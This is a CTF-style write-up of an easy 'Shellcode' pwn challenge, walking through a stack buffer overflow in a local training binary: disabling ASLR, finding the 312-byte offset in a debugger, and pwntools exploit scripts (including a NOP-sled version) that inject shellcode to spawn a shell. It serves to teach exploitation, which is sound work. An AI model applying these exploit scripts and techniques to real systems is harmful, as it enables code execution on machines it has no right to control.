---
slug: "pwn-shellcode-reworked-using-pwndbg"
title: "Shellcode (reworked using pwndbg)"
competition: "Cybersecurity Notes - GitBook"
category: "Pwn"
difficulty: "Easy"
date: "2026-07-09"
updated: "2026-07-10"
summary: ""
tags: ["PWN","EASY","SHELLCODE"]
status: "published"
flag: "-"
attachments: [{"url":"/assets/uploads/80897c2b-dec8-4a03-a379-7ac82d443be0-vuln","name":"vuln","contentType":"application/octet-stream"}]
source: "https://claritys.web.id/writeups/pwn-shellcode-reworked-using-pwndbg"
---

# Shellcode (reworked using pwndbg)

### Disabling ASLR

ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now [using this](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization).

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Again, you should never run commands if you don't know what they do

### Finding the Buffer in Memory

I'm debugging using pwndbg. Firstly, i want to analyze this ELF.

```bash
~/ctf/cybersecnotes/pwn/shellcode
❯ pwndbg vuln                                                                    󰥔 14:48:24
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from vuln...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
  <https://debuginfod.cachyos.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in vuln)
gef➤  info func
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  gets@plt
0x08049040  puts@plt
0x08049050  __libc_start_main@plt
0x08049060  _start
0x080490a0  _dl_relocate_static_pie
0x080490b0  __x86.get_pc_thunk.bx
0x080490c0  deregister_tm_clones
0x08049100  register_tm_clones
0x08049140  __do_global_dtors_aux
0x08049170  frame_dummy
0x08049172  unsafe
0x080491b1  main
0x080491c9  __x86.get_pc_thunk.ax
0x080491d0  __libc_csu_init
0x08049230  __libc_csu_fini
0x08049231  __x86.get_pc_thunk.bp
0x08049238  _fini
gef➤  disas main
Dump of assembler code for function main:
   0x080491b1 <+0>:     push   ebp
   0x080491b2 <+1>:     mov    ebp,esp
   0x080491b4 <+3>:     and    esp,0xfffffff0
   0x080491b7 <+6>:     call   0x80491c9 <__x86.get_pc_thunk.ax>
   0x080491bc <+11>:    add    eax,0x2e44
   0x080491c1 <+16>:    call   0x8049172 <unsafe>
   0x080491c6 <+21>:    nop
   0x080491c7 <+22>:    leave
   0x080491c8 <+23>:    ret
End of assembler dump.
gef➤  disas unsafe
Dump of assembler code for function unsafe:
   0x08049172 <+0>:     push   ebp
   0x08049173 <+1>:     mov    ebp,esp
   0x08049175 <+3>:     push   ebx
   0x08049176 <+4>:     sub    esp,0x134
   0x0804917c <+10>:    call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x08049181 <+15>:    add    ebx,0x2e7f
   0x08049187 <+21>:    sub    esp,0xc
   0x0804918a <+24>:    lea    eax,[ebx-0x1ff8]
   0x08049190 <+30>:    push   eax
   0x08049191 <+31>:    call   0x8049040 <puts@plt>
   0x08049196 <+36>:    add    esp,0x10
   0x08049199 <+39>:    sub    esp,0xc
   0x0804919c <+42>:    lea    eax,[ebp-0x134]
   0x080491a2 <+48>:    push   eax
   0x080491a3 <+49>:    call   0x8049030 <gets@plt>
   0x080491a8 <+54>:    add    esp,0x10
   0x080491ab <+57>:    nop                                    #I will set a breakpoint in this address.
   0x080491ac <+58>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491af <+61>:    leave
   0x080491b0 <+62>:    ret
End of assembler dump.
```

### Finding the Padding

Now we need to calculate the padding until the return pointer.

```
gef➤  cyclic 350
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma
gef➤  r
Starting program: /home/claritys/ctf/cybersecnotes/pwn/shellcode/vuln
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Overflow me                                                                                aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd84  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x64616162 ("baad"?)
$ecx   : 0x0
$edx   : 0xf7f7e894  →  0x00000000
$esp   : 0xffffcec0  →  "eaadfaadgaadhaadiaadjaadkaadlaadma"
$ebp   : 0x64616163 ("caad"?)
$esi   : 0xf7f7ce2c  →  0x0028ad4c
$edi   : 0x080491d0  →  <__libc_csu_init+0000> push ebp
$eip   : 0x64616164 ("daad"?)                    #FOCUS IN THIS ONE!
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcec0│+0x0000: "eaadfaadgaadhaadiaadjaadkaadlaadma"         ← $esp
0xffffcec4│+0x0004: "faadgaadhaadiaadjaadkaadlaadma"
0xffffcec8│+0x0008: "gaadhaadiaadjaadkaadlaadma"
0xffffcecc│+0x000c: "haadiaadjaadkaadlaadma"
0xffffced0│+0x0010: "iaadjaadkaadlaadma"
0xffffced4│+0x0014: "jaadkaadlaadma"
0xffffced8│+0x0018: "kaadlaadma"
0xffffcedc│+0x001c: "laadma"                                                               ────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x64616164

gef➤  cyclic -l daad                              #IM USING EIP VALUE
Finding cyclic pattern of 4 bytes: b'daad' (hex: 0x64616164)
Found at offset 312
```

The padding is 312 bytes.

This value that gets printed out is a **local variable** - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after `gets()` and find the exact address.

I'm running this script because my env it's little bit **'special'.**

```python

from pwn import *
import time

context.binary = './vuln'
context.terminal = ['ghostty', '-e']

p = process()

gdb.attach(p)

pause()

shellcode = asm(shellcraft.sh())

payload = shellcode
payload = payload.ljust(312, b'A')
payload += p32(0xffffcd84)

p.sendline(payload)

p.interactive()
```

![](/assets/uploads/a3725093-e4ad-4dde-acf2-0c32563f56c7-screenshot_2026-07-09_16-33-18.png)And then, i set a breakpoint in address 0x080491ab (nop).

```
gef➤  b *0x80491ab
Breakpoint 1 at 0x80491ab
gef➤  c
```

![](/assets/uploads/599c8e44-cd73-4f7a-9c88-173ceb78c4a4-screenshot_2026-07-09_16-35-20.png)

```
gef➤  p/x $ebp-0x134
$1 = 0xffffcee4
gef➤  x/32bx $ebp-0x134
0xffffcee4:     0x6a    0x68    0x68    0x2f    0x2f    0x2f    0x73    0x68
0xffffceec:     0x2f    0x62    0x69    0x6e    0x89    0xe3    0x68    0x01
0xffffcef4:     0x01    0x01    0x01    0x81    0x34    0x24    0x72    0x69
0xffffcefc:     0x01    0x01    0x31    0xc9    0x51    0x6a    0x04    0x59
```

It appears to be at `0xffffcee4`; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!). REMEMBER, THE VALUE OF $ebp - 0x134 MIGHT BE DIFFERENT, DEPENDS THE OS ARCH.

### Putting it all together

In order for the shellcode to be correct, we're going to set `context.binary` to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()
```

We can use just `process()` because once `context.binary` is set it is assumed to use that process

Now we can use pwntools' awesome shellcode functionality to make it _incredibly_ simple.

```
payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcee4)              # Address of the Shellcode
```

Yup, that's it. Now let's send it off and use `p.interactive()`, which enables us to communicate to the shell.

```
log.info(p.clean())

p.sendline(payload)

p.interactive()
```

If you're getting an `EOFError`, print out the shellcode and try to find it in memory - the stack address may be wrong

```bash
~/ctf/cybersecnotes/pwn/shellcode
❯ python3 solver.py                                                              󰥔 16:37:47
[*] '/home/claritys/ctf/cybersecnotes/pwn/shellcode/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[.] Starting local process '/home/claritys/ctf/cybersecnotes/pwn/shellcode/vuln': pid 41540[+]
/usr/lib/python3.14/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Overflow me
[*] Switching to interactive mode
$ ls
payload    source.c
exploit.py    solver.py  vuln
```

And it works! Awesome.

### Final Exploit

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcee4)              # Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

**NOP Sled**

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

shellcode = asm(shellcraft.sh())

payload = b'\x90' * 100
payload += shellcode
payload = payload.ljust(312, b'A')

payload += p32(0xffffcee4)

p.sendline(payload)

p.interactive()
```

### Summary

-   We injected shellcode, a series of assembly instructions, when prompted for input
    
-   We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode
    
-   Once the return pointer got popped into EIP, it pointed at our shellcode
    
-   This caused the program to execute our instructions, giving us (in this case) a shell for arbitrary command execution
